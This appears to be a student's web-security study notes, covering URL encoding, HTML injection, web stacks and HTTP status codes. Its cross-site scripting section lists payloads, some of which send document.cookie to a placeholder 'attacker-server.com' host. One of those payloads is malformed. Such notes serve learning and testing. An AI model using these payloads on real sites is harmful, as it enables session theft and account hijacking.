| Character | Encoding |
| --------- | -------- |
| space     | %20      |
| !         | %21      |
| "         | %22      |
| #         | %23      |
| $         | %24      |
| %         | %25      |
| &         | %26      |
| '         | %27      |
| (         | %28      |
| )         | %29      |

For URL encode / decode

```
Here is the link: https://www.url-encode-decode.com/
```


HTML Injection

Image Payload:
```
<style> body { background-image: url('https://academy.hackthebox.com/images/logo.svg'); } </style>
```

Link Payload:
```
<a href="http://www.hackthebox.com">Click Me</a>
```



Cross-Site Scripting

Payloads

```
<script>alert(1)</script>
```

```
document.getElementById("output").innerHTML = location.hash;
```

```
<script>alert(document.cookie)</script>
```

```
<img src=x onerror=alert(document.cookie)>
```

```
<svg/onload=alert(document.cookie)>
```

```
<script>fetch('https://attacker-server.com' + btoa(document.cookie));</script>
```

```
<script>document.location='http://attacker-server.com' + document.cookie;</script>
```

```
<img src="x" onerror="new Image().src='http://attacker-server.com;">
```

```
Github: https://github.com/pgaijin66/XSS-Payloads/blob/master/payload/payload.txt
```


|Combinations|Components|
|---|---|
|[LAMP](https://en.wikipedia.org/wiki/LAMP_\(software_bundle\))|`Linux`, `Apache`, `MySQL`, and `PHP`.|
|[WAMP](https://en.wikipedia.org/wiki/LAMP_\(software_bundle\)#WAMP)|`Windows`, `Apache`, `MySQL`, and `PHP`.|
|[WINS](https://en.wikipedia.org/wiki/Solution_stack)|`Windows`, `IIS`, `.NET`, and `SQL Server`|
|[MAMP](https://en.wikipedia.org/wiki/MAMP)|`macOS`, `Apache`, `MySQL`, and `PHP`.|
|[XAMPP](https://en.wikipedia.org/wiki/XAMPP)|Cross-Platform, `Apache`, `MySQL`, and `PHP/PERL`.|

| Code                        | Description                                                                                                         |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------- |
| **Successful responses**    |                                                                                                                     |
| `200 OK`                    | The request has succeeded                                                                                           |
| **Redirection messages**    |                                                                                                                     |
| `301 Moved Permanently`     | The URL of the requested resource has been changed permanently                                                      |
| `302 Found`                 | The URL of the requested resource has been changed temporarily                                                      |
| **Client error responses**  |                                                                                                                     |
| `400 Bad Request`           | The server could not understand the request due to invalid syntax                                                   |
| `401 Unauthorized`          | Unauthenticated attempt to access page                                                                              |
| `403 Forbidden`             | The client does not have access rights to the content                                                               |
| `404 Not Found`             | The server can not find the requested resource                                                                      |
| `405 Method Not Allowed`    | The request method is known by the server but has been disabled and cannot be used                                  |
| `408 Request Timeout`       | This response is sent on an idle connection by some servers, even without any previous request by the client        |
| **Server error responses**  |                                                                                                                     |
| `500 Internal Server Error` | The server has encountered a situation it doesn't know how to handle                                                |
| `502 Bad Gateway`           | The server, while working as a gateway to get a response needed to handle the request, received an invalid response |
| `504 Gateway Timeout`       | The server is acting as a gateway and cannot get a response in time                                                 |

```
To search for CVSS of CVE: https://nvd.nist.gov/
```

